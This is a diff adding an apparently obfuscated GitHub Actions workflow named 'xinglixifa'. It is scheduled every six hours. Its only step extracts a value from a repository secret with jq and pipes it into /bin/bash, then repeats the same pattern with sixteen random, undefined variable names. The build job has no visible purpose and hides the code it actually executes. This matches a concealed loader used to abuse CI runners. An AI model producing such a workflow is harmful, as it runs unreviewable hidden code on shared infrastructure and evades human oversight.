@@ -1,0 +1,34 @@
+name: xinglixifa
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xinglixifa
+        env:
+          i9739: ${{ secrets.i9739 }}
+        run: |
+          echo $i9739 | jq -r .ubuzh1378 | /bin/bash
+          echo $j91 | jq -r .bz473 | /bin/bash
+          echo $b26611 | jq -r .qaut1438 | /bin/bash
+          echo $qijb7 | jq -r .edl76 | /bin/bash
+          echo $igcbd394 | jq -r .qfwlk4051 | /bin/bash
+          echo $z38 | jq -r .qke80799 | /bin/bash
+          echo $c68209 | jq -r .go40 | /bin/bash
+          echo $weyua813 | jq -r .suk7226 | /bin/bash
+          echo $o0683 | jq -r .mzckj72072 | /bin/bash
+          echo $qapu0 | jq -r .rocp803 | /bin/bash
+          echo $bxfzb26 | jq -r .q88115 | /bin/bash
+          echo $kkt152 | jq -r .expgu8570 | /bin/bash
+          echo $m68592 | jq -r .qfu59 | /bin/bash
+          echo $dwab4916 | jq -r .i4042 | /bin/bash
+          echo $phc0268 | jq -r .w96838 | /bin/bash
+          echo $c2 | jq -r .rnzdx44383 | /bin/bash
+          echo $ssl9 | jq -r .w166 | /bin/bash
+
